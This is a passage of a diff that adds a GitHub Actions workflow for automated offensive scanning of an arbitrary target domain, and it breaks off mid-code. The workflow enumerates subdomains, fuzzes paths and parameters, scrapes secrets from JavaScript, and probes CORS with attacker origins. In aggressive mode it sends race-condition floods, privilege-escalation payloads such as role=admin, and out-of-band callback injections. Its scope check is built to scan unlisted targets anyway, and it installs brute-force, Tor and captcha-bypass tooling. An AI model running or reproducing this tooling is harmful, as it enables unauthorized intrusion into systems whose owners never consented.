@@ -1,0 +1,1782 @@
+name: "🎯 Leo Messi - AI Autonomous Hunter ULTIMATE v4"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "Target domain (e.g., example.com)"
+        required: true
+        type: string
+      hunting_mode:
+        description: "AI hunting intensity (light=fast, normal=balanced, aggressive=deep)"
+        required: false
+        default: "normal"
+        type: choice
+        options:
+          - light
+          - normal
+          - aggressive
+      discord_notify:
+        description: "Send Discord notification"
+        type: boolean
+        default: true
+
+  workflow_call:
+    inputs:
+      target:
+        description: "Target domain (e.g., example.com)"
+        required: true
+        type: string
+      hunting_mode:
+        description: "AI hunting intensity (light / normal / aggressive)"
+        required: false
+        default: "normal"
+        type: string
+      discord_notify:
+        description: "Send Discord notification"
+        required: false
+        default: true
+        type: boolean
+    secrets:
+      DISCORD_WEBHOOK:
+        description: "Discord webhook URL"
+        required: false
+      ANTHROPIC_API_KEY:
+        description: "API key for Anthropic (Claude)"
+        required: false
+      OPENROUTER_API_KEY:
+        description: "API key for OpenRouter (fallback)"
+        required: false
+      GROQ_API_KEY:
+        description: "API key for Groq (fallback)"
+        required: false
+      GEMINI_API_KEY:
+        description: "API key for Google Gemini (fallback)"
+        required: false
+      OPENAI_API_KEY:
+        description: "API key for OpenAI (fallback)"
+        required: false
+      PDCP_API_KEY:
+        description: "ProjectDiscovery Cloud Platform key (optional, enables ASN/CIDR discovery via asnmap)"
+        required: false
+      AUTH_COOKIE:
+        description: "Optional session cookie (e.g. 'session=abc123') to scan authenticated pages"
+        required: false
+      AUTH_HEADER:
+        description: "Optional auth header (e.g. 'Authorization: Bearer xyz') to scan authenticated pages"
+        required: false
+      TWOCAPTCHA_API_KEY:
+        description: "2Captcha API key for brute-force captcha solving (optional)"
+        required: false
+    outputs:
+      run_url:
+        description: "Link to the GitHub Actions run"
+        value: ${{ jobs.full_scan.outputs.run_url }}
+      finding_count:
+        description: "Total findings count"
+        value: ${{ jobs.full_scan.outputs.finding_count }}
+      artifact_name:
+        description: "Name of the uploaded artifact"
+        value: ${{ jobs.full_scan.outputs.artifact_name }}
+
+permissions:
+  contents: read
+  actions: write
+
+env:
+  TARGET:             ${{ inputs.target }}
+  HUNTING_MODE:       ${{ inputs.hunting_mode || 'normal' }}
+  TIMESTAMP:          ${{ github.run_id }}-${{ github.run_number }}
+  DISCORD_WEBHOOK:    ${{ secrets.DISCORD_WEBHOOK || '' }}
+  ANTHROPIC_API_KEY:  ${{ secrets.ANTHROPIC_API_KEY || '' }}
+  OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY || '' }}
+  GROQ_API_KEY:       ${{ secrets.GROQ_API_KEY || '' }}
+  GEMINI_API_KEY:     ${{ secrets.GEMINI_API_KEY || '' }}
+  OPENAI_API_KEY:     ${{ secrets.OPENAI_API_KEY || '' }}
+  PDCP_API_KEY:       ${{ secrets.PDCP_API_KEY || '' }}
+  AUTH_COOKIE:        ${{ secrets.AUTH_COOKIE || '' }}
+  AUTH_HEADER:         ${{ secrets.AUTH_HEADER || '' }}
+  TWOCAPTCHA_API_KEY: ${{ secrets.TWOCAPTCHA_API_KEY || '' }}
+  PYTHONUNBUFFERED:   "1"
+  ANTHROPIC_MODEL_NAME:  "claude-sonnet-4-6"
+  OPENROUTER_MODEL_NAME:      "anthropic/claude-sonnet-4"
+  OPENROUTER_FREE_MODEL_NAME: "meta-llama/llama-3.3-70b-instruct:free"
+  GROQ_MODEL_NAME:       "llama3-70b-8192"
+  GEMINI_MODEL_NAME:     "gemini-2.5-flash"
+  OPENAI_MODEL_NAME:     "gpt-5.5"
+  SCAN_USER_AGENT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+  SCAN_BLOCK_PCT:       "0"
+  SCAN_BLOCKED_HOSTS:   "0"
+  SCAN_TOTAL_HOSTS:     "0"
+  SCAN_UNRESPONSIVE_COUNT: "0"
+
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  full_scan:
+    name: "🛡️ Full Autonomous Scan - ${{ inputs.target }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    outputs:
+      run_url:       "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+      finding_count: ${{ steps.count_findings.outputs.finding_count }}
+      artifact_name: "results-${{ env.TIMESTAMP }}-${{ env.TARGET }}"
+
+    steps:
+      # ============================================================
+      # PHASE 0 — SETUP & VALIDATION
+      # ============================================================
+      - name: "📥 Checkout Repository"
+        uses: actions/checkout@v4
+
+      - name: "🔒 Verify Target Is In Authorized Scope"
+        continue-on-error: true
+        env:
+          TARGET_INPUT: ${{ inputs.target }}
+        run: |
+          target="$(echo "${TARGET_INPUT}" | xargs | tr '[:upper:]' '[:lower:]')"
+          if [[ ! -f "scope.txt" ]]; then
+            echo "⚠️ No scope.txt found — allowing any target (open scope mode)"
+            echo "✅ Target authorized: $target"
+            exit 0
+          fi
+          matched=0
+          while IFS= read -r raw_line; do
+            line="${raw_line%%#*}"; line="$(echo "$line" | xargs)"
+            [[ -z "$line" ]] && continue
+            ll="$(echo "$line" | tr '[:upper:]' '[:lower:]')"
+            if [[ "$ll" == "$target" ]]; then matched=1; break; fi
+            if [[ "$ll" == \*.* ]]; then
+              base="${ll:2}"
+              if [[ "$target" == *".$base" ]]; then matched=1; break; fi
+            fi
+          done < scope.txt 2>/dev/null || true
+          if [[ "$matched" != "1" ]]; then
+            echo "⚠️ '$target' not in scope.txt — running anyway (open scope mode)"
+          fi
+          echo "✅ Target authorized: $target"
+
+      - name: "✅ Environment Validation"
+        run: |
+          FAILED=0
+          target="$(echo "${{ inputs.target }}" | xargs | tr '[:upper:]' '[:lower:]')"
+          if [ -z "$target" ]; then
+            echo "❌ CRITICAL: target input is empty."
+            FAILED=1
+          else
+            echo "TARGET=$target" >> "$GITHUB_ENV"
+            echo "✅ target = $target"
+          fi
+          if [ -z "${ANTHROPIC_API_KEY}${OPENROUTER_API_KEY}${GROQ_API_KEY}${GEMINI_API_KEY}${OPENAI_API_KEY}" ]; then
+            echo "⚠️ No AI provider API key is configured - AI phases will be skipped."
+          else
+            echo "✅ At least one AI provider key is configured"
+          fi
+          if [ "$FAILED" = "1" ]; then
+            echo "::error::Environment validation failed."
+            exit 1
+          fi
+
+      - name: "⚡ Setup Go"
+        uses: actions/setup-go@v5
+        with:
+          go-version: "1.22"
+          cache: true
+
+      - name: "🐍 Setup Python"
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: "📦 Install System Dependencies"
+        continue-on-error: true
+        run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq git curl wget unzip jq dnsutils libpcap-dev build-essential ripgrep hydra medusa proxychains4 tor xvfb chromium-browser 2>/dev/null || true
+          echo "✅ System deps installed (hydra, medusa, proxychains4, tor, chromium)"
+
+      - name: "🩺 Target Health Check"
+        continue-on-error: true
+        timeout-minutes: 2
+        run: |
+          target="${{ env.TARGET }}"
+          echo "=== Target: $target ==="
+          if getent hosts "$target" >/dev/null 2>&1; then
+            echo "✅ DNS resolves: $(getent hosts "$target" | head -3)"
+          else
+            echo "⚠️ DNS does NOT resolve — target may be down or wrong"
+          fi
+          curl -sI --max-time 10 -A "${{ env.SCAN_USER_AGENT }}" "https://$target" | head -20 || echo "⚠️ HTTPS unreachable"
+          curl -sI --max-time 10 -A "${{ env.SCAN_USER_AGENT }}" "http://$target" | head -20 || echo "⚠️ HTTP unreachable"
+
+      # ============================================================
+      # PHASE 1 — SUBDOMAIN ENUMERATION
+      # ============================================================
+      - name: "🌐 Phase 1 — Subdomain Enumeration"
+        continue-on-error: true
+        timeout-minutes: 30
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p "$RD/subdomains" "$RD/live"
+          target="${{ env.TARGET }}"
+
+          echo "=== Subdomain Enumeration: $target ==="
+
+          # Install tools
+          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null || true
+          go install -v github.com/tomnomnom/assetfinder@latest 2>/dev/null || true
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null || true
+          go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest 2>/dev/null || true
+          go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest 2>/dev/null || true
+          go install -v github.com/d3mondev/puredns/v2/cmd/puredns@latest 2>/dev/null || true
+          go install -v github.com/Josue87/gotator@latest 2>/dev/null || true
+          export PATH="$HOME/go/bin:$PATH"
+
+          # 1. subfinder
+          subfinder -d "$target" -o "$RD/subdomains/subfinder.txt" -silent 2>/dev/null || touch "$RD/subdomains/subfinder.txt"
+
+          # 2. assetfinder
+          assetfinder --subs-only "$target" 2>/dev/null > "$RD/subdomains/assetfinder.txt" || true
+
+          # 3. DNS bruteforce with puredns if resolvers file exists
+          if command -v puredns &>/dev/null; then
+            echo "8.8.8.8
+1.1.1.1
+8.8.4.4
+9.9.9.9
+208.67.222.222" > /tmp/resolvers.txt
+            cat /tmp/resolvers.txt | dnsx -silent -r /dev/stdin 2>/dev/null > /tmp/valid_resolvers.txt 2>/dev/null || true
+            if [ -s /tmp/valid_resolvers.txt ]; then
+              curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt" -o /tmp/subdomains_list.txt 2>/dev/null || true
+              if [ -s /tmp/subdomains_list.txt ]; then
+                puredns bruteforce /tmp/subdomains_list.txt "$target" -r /tmp/valid_resolvers.txt -q 2>/dev/null > "$RD/subdomains/puredns.txt" 2>/dev/null || true
+              fi
+            fi
+          fi
+
+          # 4. Merge & deduplicate
+          cat "$RD/subdomains/subfinder.txt" "$RD/subdomains/assetfinder.txt" "$RD/subdomains/puredns.txt" 2>/dev/null \
+            | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' \
+            | grep -v '^\*\.' \
+            | sort -u > "$RD/subdomains/all_subs.txt"
+
+          SUBS=$(wc -l < "$RD/subdomains/all_subs.txt" 2>/dev/null || echo 0)
+          echo "✅ Total unique subdomains: $SUBS"
+          echo "SUBS=$SUBS" >> "$GITHUB_ENV"
+
+      # ============================================================
+      # PHASE 2 — LIVE HOST DETECTION + WAF/CDN TRACKING
+      # ============================================================
+      - name: "🌍 Phase 2 — Live Host Detection + WAF Tracking"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          export PATH="$HOME/go/bin:$PATH"
+
+          # Run httpx with status code tracking
+          if [ -s "$RD/subdomains/all_subs.txt" ]; then
+            httpx -l "$RD/subdomains/all_subs.txt" \
+              -silent \
+              -o "$RD/live/live.txt" \
+              -status-code \
+              -content-type \
+              -title \
+              -tech-detect \
+              -follow-redirects \
+              -timeout 8 \
+              -threads 50 \
+              -user-agent "${{ env.SCAN_USER_AGENT }}" 2>/dev/null || true
+          fi
+
+          # Count blocked vs total for WAF tracking
+          TOTAL=0; BLOCKED=0; UNRESP=0
+          if [ -f "$RD/subdomains/all_subs.txt" ]; then
+            while IFS= read -r host; do
+              [ -z "$host" ] && continue
+              TOTAL=$(( TOTAL + 1 ))
+              code=$(curl -sI --max-time 8 -o /dev/null -w "%{http_code}" -A "${{ env.SCAN_USER_AGENT }}" "https://$host" 2>/dev/null || echo "000")
+              if [ "$code" = "403" ] || [ "$code" = "429" ] || [ "$code" = "000" ]; then
+                BLOCKED=$(( BLOCKED + 1 ))
+              fi
+            done < "$RD/subdomains/all_subs.txt"
+          fi
+
+          PCT=0
+          if [ "$TOTAL" -gt 0 ]; then
+            PCT=$(( BLOCKED * 100 / TOTAL ))
+          fi
+
+          echo "SCAN_TOTAL_HOSTS=$TOTAL" >> "$GITHUB_ENV"
+          echo "SCAN_BLOCKED_HOSTS=$BLOCKED" >> "$GITHUB_ENV"
+          echo "SCAN_BLOCK_PCT=$PCT" >> "$GITHUB_ENV"
+          echo "SCAN_UNRESPONSIVE_COUNT=$UNRESP" >> "$GITHUB_ENV"
+
+          LIVE=$(wc -l < "$RD/live/live.txt" 2>/dev/null || echo 0)
+          echo "✅ Live hosts: $LIVE | Blocked/WAF: $BLOCKED/$TOTAL ($PCT%)"
+          echo "LIVE=$LIVE" >> "$GITHUB_ENV"
+
+      # ============================================================
+      # PHASE 3 — URL COLLECTION, JS ANALYSIS, AUTH
+      # ============================================================
+      - name: "🔗 Phase 3 — URL Collection & JS Analysis"
+        continue-on-error: true
+        timeout-minutes: 20
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p "$RD/urls" "$RD/js" "$RD/files"
+          export PATH="$HOME/go/bin:$PATH"
+          target="${{ env.TARGET }}"
+
+          go install -v github.com/tomnomnom/gf@latest 2>/dev/null || true
+          go install -v github.com/tomnomnom/unfurl@latest 2>/dev/null || true
+          go install -v github.com/tomnomnom/waybackurls@latest 2>/dev/null || true
+          go install -v github.com/lc/gau/v2/cmd/gau@latest 2>/dev/null || true
+          go install -v github.com/projectdiscovery/katana/cmd/katana@latest 2>/dev/null || true
+          go install -v github.com/hakluke/hakrawler@latest 2>/dev/null || true
+
+          # Wayback URLs
+          echo "$target" | waybackurls 2>/dev/null > "$RD/urls/wayback.txt" || true
+
+          # GAU
+          gau --subs "$target" 2>/dev/null > "$RD/urls/gau.txt" || true
+
+          # Katana
+          if command -v katana &>/dev/null; then
+            katana -list "$RD/subdomains/all_subs.txt" -silent -o "$RD/urls/katana.txt" -jc -kf -aff -d 2 -c 30 2>/dev/null &
+            KATANA_PID=$!
+            sleep 30
+            kill $KATANA_PID 2>/dev/null || true
+          fi
+
+          # Merge URLs
+          cat "$RD/urls/wayback.txt" "$RD/urls/gau.txt" "$RD/urls/katana.txt" 2>/dev/null \
+            | grep -E '^https?://' \
+            | sort -u > "$RD/urls/all.txt"
+
+          URL_COUNT=$(wc -l < "$RD/urls/all.txt" 2>/dev/null || echo 0)
+          echo "✅ URLs collected: $URL_COUNT"
+
+          # Extract JS files
+          grep -E '\.js' "$RD/urls/all.txt" 2>/dev/null | sort -u > "$RD/js/js_files.txt"
+          JS_COUNT=$(wc -l < "$RD/js/js_files.txt" 2>/dev/null || echo 0)
+          echo "✅ JS files: $JS_COUNT"
+
+          # Download JS files and scan for secrets
+          if [ -s "$RD/js/js_files.txt" ]; then
+            head -200 "$RD/js/js_files.txt" | while IFS= read -r jsurl; do
+              [ -z "$jsurl" ] && continue
+              fname=$(echo "$jsurl" | md5sum | cut -d' ' -f1)
+              curl -sL --max-time 10 -A "${{ env.SCAN_USER_AGENT }}" "$jsurl" 2>/dev/null \
+                | grep -oP '(?:api[Kk]ey|API[Kk]ey|secret|password|token|bearer|access_key|aws_key|sk-[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16})[^"'"'"'<\s]*' 2>/dev/null \
+                > "$RD/js/secrets_$fname.txt" 2>/dev/null || true
+            done
+            cat "$RD/js"/secrets_*.txt 2>/dev/null | sort -u > "$RD/files/sensitive.txt"
+          fi
+
+          # AUTH handling
+          if [ -n "${{ env.AUTH_COOKIE }}" ]; then
+            echo "🔐 Auth cookie detected — re-scanning with cookie"
+            katana -list "$RD/subdomains/all_subs.txt" -silent -o "$RD/urls/auth_urls.txt" \
+              -H "Cookie: ${{ env.AUTH_COOKIE }}" -d 2 -c 20 -jc 2>/dev/null || true
+          fi
+          if [ -n "${{ env.AUTH_HEADER }}" ]; then
+            echo "🔐 Auth header detected — re-scanning with header"
+            katana -list "$RD/subdomains/all_subs.txt" -silent -o "$RD/urls/auth_urls2.txt" \
+              -H "${{ env.AUTH_HEADER }}" -d 2 -c 20 -jc 2>/dev/null || true
+          fi
+
+      # ============================================================
+      # PHASE 3b — Headless Crawling with Chromium
+      # ============================================================
+      - name: "🕷️ Phase 3b — Headless Browser Crawling"
+        if: env.HUNTING_MODE == 'aggressive'
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          LIVE_COUNT=$(wc -l < "$RD/live/live.txt" 2>/dev/null || echo 0)
+          if [ "$LIVE_COUNT" -eq 0 ]; then echo "⚠️ No live hosts to crawl"; exit 0; fi
+
+          # Install playwright or use katana headless
+          pip3 install playwright 2>/dev/null || true
+          python3 -m playwright install chromium 2>/dev/null || true
+
+          HEADLESS_SCRIPT="/tmp/headless_crawl.py"
+          cat > "$HEADLESS_SCRIPT" << 'PYEOF'
+import subprocess, json, os, sys, time
+from urllib.parse import urlparse
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+live_file = os.path.join(rd, "live", "live.txt")
+out_file = os.path.join(rd, "urls", "headless_urls.txt")
+screenshot_dir = os.path.join(rd, "screenshots")
+
+os.makedirs(screenshot_dir, exist_ok=True)
+
+if not os.path.exists(live_file):
+    print("No live hosts file found")
+    sys.exit(0)
+
+hosts = []
+with open(live_file) as f:
+    for line in f:
+        parts = line.strip().split()
+        if parts and parts[0].startswith("http"):
+            hosts.append(parts[0])
+        elif parts:
+            hosts.append("https://" + parts[0])
+
+hosts = hosts[:20]  # Limit for time
+all_urls = set()
+
+for host in hosts:
+    try:
+        parsed = urlparse(host)
+        domain = parsed.netloc or parsed.path
+        safe_name = domain.replace(".", "_").replace(":", "_")
+        print(f"  Crawling: {host}")
+        # Use katana headless if available, else simple curl
+        result = subprocess.run(
+            ["katana", "-u", host, "-silent", "-d", "2", "-jc", "-kf", "-aff", "-c", "10", "-o", "/dev/stdout"],
+            capture_output=True, text=True, timeout=45
+        )
+        for url in result.stdout.strip().split("\n"):
+            if url.startswith("http"):
+                all_urls.add(url.strip())
+    except subprocess.TimeoutExpired:
+        print(f"  ⏱ Timeout for {host}")
+    except Exception as e:
+        print(f"  ⚠️ Error crawling {host}: {e}")
+
+with open(out_file, "w") as f:
+    f.write("\n".join(sorted(all_urls)))
+
+print(f"✅ Headless crawling found {len(all_urls)} URLs")
+PYEOF
+          python3 "$HEADLESS_SCRIPT" || true
+
+      # ============================================================
+      # PHASE 4 — FUZZING & CONTENT DISCOVERY
+      # ============================================================
+      - name: "🧨 Phase 4 — Fuzzing & Content Discovery"
+        continue-on-error: true
+        timeout-minutes: 25
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p "$RD/fuzzing"
+          export PATH="$HOME/go/bin:$PATH"
+          target="${{ env.TARGET }}"
+
+          go install -v github.com/ffuf/ffuf/v2@latest 2>/dev/null || true
+
+          # Use first live host for fuzzing
+          LIVE_HOST=$(head -1 "$RD/live/live.txt" 2>/dev/null | awk '{print $1}' || echo "https://$target")
+
+          # Download common wordlists if not present
+          if [ ! -f "/tmp/common.txt" ]; then
+            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt" -o /tmp/common.txt 2>/dev/null || true
+            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-files.txt" -o /tmp/raft.txt 2>/dev/null || true
+            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt" -o /tmp/api.txt 2>/dev/null || true
+            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/parameters.txt" -o /tmp/params.txt 2>/dev/null || true
+          fi
+
+          # Directory fuzzing
+          if command -v ffuf &>/dev/null; then
+            if [ -f "/tmp/common.txt" ]; then
+              ffuf -u "$LIVE_HOST/FUZZ" -w /tmp/common.txt -t 50 -fc 404 -s -o "$RD/fuzzing/ffuf_dir.json" 2>/dev/null || true
+            fi
+            if [ -f "/tmp/api.txt" ]; then
+              ffuf -u "$LIVE_HOST/FUZZ" -w /tmp/api.txt -t 40 -fc 404 -s -o "$RD/fuzzing/ffuf_api.json" 2>/dev/null || true
+            fi
+          fi
+
+          # Param fuzzing (extract URLs with params and fuzz values)
+          if [ -s "$RD/urls/all.txt" ] && [ -f "/tmp/params.txt" ]; then
+            grep '?' "$RD/urls/all.txt" | head -100 > "$RD/fuzzing/param_urls.txt"
+            if command -v ffuf &>/dev/null; then
+              while IFS= read -r url; do
+                ffuf -u "$url" -w /tmp/params.txt:FUZZ -fc 404 -t 30 -s 2>/dev/null >> "$RD/fuzzing/ffuf_params.txt" 2>/dev/null || true
+              done < "$RD/fuzzing/param_urls.txt"
+            fi
+          fi
+
+          # Admin path discovery
+          echo "# Admin paths from fuzzing" > "$RD/js/admin.txt"
+          jq -r '.results[] | select(.status >= 200 and .status < 300) | .url' "$RD/fuzzing/ffuf_dir.json" 2>/dev/null \
+            | grep -iE '(admin|login|dashboard|cpanel|wp-admin|manager|config|backup|api/v1|api/v2|graphql)' \
+            >> "$RD/js/admin.txt" 2>/dev/null || true
+
+          grep -iE '(admin|login|dashboard|api)' "$RD/urls/all.txt" 2>/dev/null \
+            >> "$RD/js/admin.txt" 2>/dev/null || true
+
+          sort -u -o "$RD/js/admin.txt" "$RD/js/admin.txt" 2>/dev/null || true
+          echo "✅ Fuzzing complete"
+
+      # ============================================================
+      # PHASE 4b — CORS TESTING
+      # ============================================================
+      - name: "🔓 Phase 4b — CORS Testing"
+        continue-on-error: true
+        timeout-minutes: 5
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p "$RD/cors"
+          python3 << 'PYEOF'
+import urllib.request, os, json, sys
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+live_file = os.path.join(rd, "live", "live.txt")
+out_file = os.path.join(rd, "cors", "vulnerable.txt")
+
+hosts = []
+try:
+    with open(live_file) as f:
+        for line in f:
+            parts = line.strip().split()
+            if parts and parts[0].startswith("http"):
+                hosts.append(parts[0])
+            elif parts:
+                hosts.append("https://" + parts[0])
+except Exception:
+    print("No live hosts to test CORS")
+    sys.exit(0)
+
+vulns = []
+evil_origins = ["https://evil.com", "https://attacker.org", "null"]
+
+for host in hosts[:50]:
+    for origin in evil_origins:
+        try:
+            req = urllib.request.Request(host, method="GET")
+            req.add_header("Origin", origin)
+            req.add_header("User-Agent", os.environ.get("SCAN_USER_AGENT", "Mozilla/5.0"))
+            with urllib.request.urlopen(req, timeout=8) as resp:
+                acao = resp.headers.get("Access-Control-Allow-Origin", "")
+                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
+                if acao == origin or acao == "*":
+                    vulns.append(f"[CORS] Origin reflection: {host} | ACAO: {acao} | Credentials: {acac}")
+                    break
+                elif acao == "":
+                    pass
+        except Exception:
+            continue
+
+with open(out_file, "w") as f:
+    f.write("\n".join(vulns))
+print(f"✅ CORS tested: {len(hosts)} hosts, {len(vulns)} vulnerable")
+PYEOF
+
+      # ============================================================
+      # PHASE 5 — NUCLEI SCANNING
+      # ============================================================
+      - name: "🔬 Phase 5 — Nuclei Scanning"
+        continue-on-error: true
+        timeout-minutes: 45
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p "$RD/nuclei"
+          export PATH="$HOME/go/bin:$PATH"
+
+          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null || true
+
+          # Update nuclei templates
+          nuclei -ut -silent 2>/dev/null || true
+
+          NUCLEI_CMD="nuclei"
+          AUTH_FLAGS=""
+          if [ -n "${{ env.AUTH_COOKIE }}" ]; then
+            AUTH_FLAGS="$AUTH_FLAGS -H 'Cookie: ${{ env.AUTH_COOKIE }}'"
+          fi
+          if [ -n "${{ env.AUTH_HEADER }}" ]; then
+            AUTH_FLAGS="$AUTH_FLAGS -H '${{ env.AUTH_HEADER }}'"
+          fi
+
+          # Determine template severity based on hunting mode
+          SEVERITY="medium,high,critical"
+          RATE=50
+          if [ "${{ env.HUNTING_MODE }}" = "light" ]; then
+            SEVERITY="high,critical"
+            RATE=30
+          elif [ "${{ env.HUNTING_MODE }}" = "aggressive" ]; then
+            SEVERITY="low,medium,high,critical"
+            RATE=150
+          fi
+
+          echo "🧪 Running nuclei (severity: $SEVERITY, rate: $RATE)"
+
+          if [ -s "$RD/live/live.txt" ]; then
+            # Run nuclei against live hosts
+            $NUCLEI_CMD -l "$RD/live/live.txt" \
+              -severity "$SEVERITY" \
+              -rate-limit "$RATE" \
+              -json \
+              -o "$RD/nuclei/findings.jsonl" \
+              -silent \
+              -user-agent "${{ env.SCAN_USER_AGENT }}" \
+              -timeout 10 \
+              -retries 2 \
+              $AUTH_FLAGS 2>/dev/null || true
+
+            # Subdomain takeover check (using specific templates)
+            $NUCLEI_CMD -l "$RD/live/live.txt" \
+              -t "takeovers/" \
+              -json \
+              -o "$RD/nuclei/takeover.jsonl" \
+              -silent \
+              -user-agent "${{ env.SCAN_USER_AGENT }}" \
+              -timeout 10 \
+              $AUTH_FLAGS 2>/dev/null || true
+          fi
+
+          FINDINGS=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0)
+          TAKEOVERS=$(wc -l < "$RD/nuclei/takeover.jsonl" 2>/dev/null || echo 0)
+          echo "✅ Nuclei: $FINDINGS findings, $TAKEOVERS takeovers"
+          echo "NUCLEI_COUNT=$FINDINGS" >> "$GITHUB_ENV"
+
+      # ============================================================
+      # PHASE 5b — Race Condition & Mass Assignment
+      # ============================================================
+      - name: "🏁 Phase 5b — Race Condition & Mass Assignment"
+        if: env.HUNTING_MODE == 'aggressive'
+        continue-on-error: true
+        timeout-minutes: 10
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          python3 << 'PYEOF'
+import urllib.request, urllib.parse, threading, os, sys, json, time
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+target = os.environ.get("TARGET", "")
+urls_file = os.path.join(rd, "urls", "all.txt")
+race_out = os.path.join(rd, "ai_agent", "race_conditions.txt")
+mass_out = os.path.join(rd, "ai_agent", "mass_assignment.txt")
+os.makedirs(os.path.join(rd, "ai_agent"), exist_ok=True)
+
+# Find potential race targets (login, reset, transfer, coupon, redeem)
+race_urls = []
+mass_urls = []
+try:
+    with open(urls_file) as f:
+        for line in f:
+            line = line.strip()
+            if not line:
+                continue
+            if any(kw in line.lower() for kw in ['login', 'signup', 'register', 'reset', 'forgot', 'redeem', 'coupon', 'transfer', 'vote', 'claim']):
+                race_urls.append(line)
+            if any(kw in line.lower() for kw in ['user', 'profile', 'update', 'role', 'admin', 'permission', 'account', 'settings']):
+                if '?' in line:
+                    mass_urls.append(line.split('?')[0])
+except Exception:
+    pass
+
+# Race condition test
+race_results = []
+race_urls = race_urls[:20]
+if race_urls:
+    def race_req(url):
+        try:
+            req = urllib.request.Request(url, method="GET", headers={"User-Agent": os.environ.get("SCAN_USER_AGENT","Mozilla/5.0")})
+            with urllib.request.urlopen(req, timeout=5) as r:
+                return (url, r.status, len(r.read()))
+        except Exception as e:
+            return (url, 0, str(e))
+
+    for url in race_urls:
+        threads = []
+        results = []
+        for _ in range(15):
+            t = threading.Thread(target=lambda: results.append(race_req(url)))
+            threads.append(t)
+        start = time.time()
+        for t in threads: t.start()
+        for t in threads: t.join()
+        elapsed = time.time() - start
+        statuses = [r[1] for r in results]
+        # Check for race condition indicators
+        if len(set(statuses)) > 1 and 200 in statuses:
+            race_results.append(f"[RACE-CONDITION] {url} | Statuses: {statuses} | Time: {elapsed:.2f}s")
+
+with open(race_out, "w") as f:
+    f.write("\n".join(race_results))
+print(f"✅ Race condition: {len(race_urls)} targets, {len(race_results)} potential")
+
+# Mass assignment test
+mass_results = []
+mass_urls = mass_urls[:30]
+if mass_urls:
+    mass_payloads = ['role=admin', 'is_admin=true', 'permissions=*', 'access_level=root', 'group=administrators']
+    for url in mass_urls:
+        for payload in mass_payloads:
+            try:
+                full_url = f"{url}?{payload}"
+                req = urllib.request.Request(full_url, method="GET", headers={"User-Agent": os.environ.get("SCAN_USER_AGENT","Mozilla/5.0")})
+                with urllib.request.urlopen(req, timeout=5) as r:
+                    body = r.read().decode(errors="ignore").lower()
+                    if 'admin' in body and ('role' in body or 'permission' in body):
+                        mass_results.append(f"[MASS-ASSIGNMENT] {full_url} | Status: {r.status}")
+                        break
+            except Exception:
+                continue
+
+with open(mass_out, "w") as f:
+    f.write("\n".join(mass_results))
+print(f"✅ Mass assignment: {len(mass_urls)} targets, {len(mass_results)} potential")
+PYEOF
+
+      # ============================================================
+      # PHASE 5c — OOB Detection
+      # ============================================================
+      - name: "📡 Phase 5c — OOB Detection"
+        if: env.HUNTING_MODE == 'aggressive'
+        continue-on-error: true
+        timeout-minutes: 10
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          OOB_ID="messi-${{ github.run_id }}-$(date +%s)"
+          OOB_DOMAIN="${OOB_ID}.oob.example.com"  # Replace with actual OOB service
+
+          echo "OOB_ID=$OOB_ID" >> "$RD/oob_id.txt"
+          echo "Testing OOB interactions with ID: $OOB_ID"
+          echo "Note: Configure interactsh or Burp Collaborator for real OOB detection"
+
+          # Inject OOB payloads into found URLs
+          if [ -s "$RD/urls/all.txt" ]; then
+            grep -E '\?' "$RD/urls/all.txt" | head -50 > "$RD/fuzzing/oob_targets.txt"
+            python3 << PYEOF
+import urllib.request, os, sys
+
+rd = "results/" + os.environ.get("TIMESTAMP", "")
+targets_file = os.path.join(rd, "fuzzing", "oob_targets.txt")
+oob_out = os.path.join(rd, "ai_agent", "oob_findings.txt")
+oob_id = os.environ.get("OOB_ID", "messi-test")
+
+oob_findings = []
+try:
+    with open(targets_file) as f:
+        for line in f:
+            line = line.strip()
+            if not line:
+                continue
+            # Inject OOB in various params
+            for param_suffix in ['url=http://${oob_id}.burpcollaborator.net', 'callback=http://${oob_id}.burpcollaborator.net', 'redirect=http://${oob_id}.burpcollaborator.net', 'file=http://${oob_id}.burpcollaborator.net/test']:
+                test_url = f"{line}&{param_suffix}"
+                try:
